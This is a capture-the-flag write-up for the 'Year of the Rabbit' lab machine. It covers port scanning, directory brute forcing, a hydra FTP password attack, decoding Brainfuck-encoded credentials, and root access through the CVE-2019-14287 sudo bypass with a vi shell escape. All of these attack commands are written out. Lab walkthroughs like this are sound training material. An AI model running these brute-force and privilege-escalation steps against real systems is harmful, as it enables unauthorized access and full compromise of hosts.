**This is a beginning ctf level**  **called Year of the Rabbit**  

Let’s start our Ctf by scanning the open ports using **Nmap** 

nmap -sV **IP**

Output : 

**### PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel**

So we found 3 open ports **FTP** , **SSH** , **HTTP**  let's check 

Port 80 HTTP  : Web Server

2 - Brute Forcinf Directorys with **Dirb**

dirb http://**IP-machine**/

We found a intersting Directory called  **/assets**

inside this Directory we Found  : RickRolled.mp4 & style.css

inside style.css i found a hidden directory :

 /* Nice to see someone checking the stylesheets.
     Take a look at the page: /sup3r_s3cr3t_fl4g.php
  */


When i open this Directory and i was redirect to video in youtube 


lets download  sup3r_s3cr3t_fl4g.php with **wget**  and read the code 

wget http://IP-machine/sup3r_s3cr3t_fl4g.php

```
<html>
	<head>
		<title>sup3r_s3cr3t_fl4g</title>
	</head>
	<body>
		<noscript>Love it when people block Javascript...<br></noscript>
		<noscript>This is happening whether you like it or not... The hint is in the video. If you're stuck here then you're just going to have to bite the bullet!<br>Make sure your audio is turned up!<br></noscript>
		<script>
			alert("Word of advice... Turn off your javascript...");
			window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1";
		</script>
		<video controls>
			<source src="/assets/RickRolled.mp4" type="video/mp4">
		</video>
	</body>
</html>
```
nothing intersting :( 

lets interecpt the request of sup3r_s3cr3t_fl4g.php with **burp**

We Found a hidden Directory :

**`Location: intermediary.php?hidden_directory=/WEx*********`**

We have a new directory to play with. And there we have a **Hot_Babe.png**, so it's stegno Time  :)

Lets us strings to grab the Hidden String :

strings **Hot_Babe.png**  | grep user 

`Eh, you've earned this. Username for FTP is ftpu***`

strings **Hot_Babe.png**  
```

One of these is the password:
...
...
...
...


```

so Now we have a passwords and a user we can brute force **FTP** using hydra :


**hydra -l ftp*** -P pass.txt ftp://IP-machine -t 30**

output : 

`[21][ftp] host: IP  login: ftpu***   password: 5iez1w*******`


run ls -a and we have a file called El**_Creds.txt, use get FILENAME to transfer a file back to your host.

cat El**_Creds.txt

output :

```
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <
```
a few research i found the name of this language **brainfuck** i use [](https://www.dcode.fr/langage-brainfuck) to decode 


output : 

```
User: e***

Password: DSpDiM******

```
On connection we get a welcome message:

```
Message from Root to Gwe*****:

"Gwe*****, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"
```
lets use find command to find s3cr3t directory

**find / -name s3cr3t 2>/dev/null**

`/usr/games/s3cr3t/`

i Found a intersting file .**th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!**

lets check what inside this file 

**cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!**

output :


```
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MniVCQ*****
Honestly!

```
login with a new user

 **su gwendoline**

use basic privilegeescal : 

**sudo -l**

output : 

User gwe****** may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwe******/user.txt


lets check sudo version : **sudo -v**

a few researching  i Found a  **CVE-2019-14287**  

 **`sudo -u#-1 /usr/bin/vi /home/gwe******/user.txt then vi opens up, type :!/bin/bash the exclamation mark allows us to execute commands in the command line!`**  

we are root ! :) 

see u in another write up By 
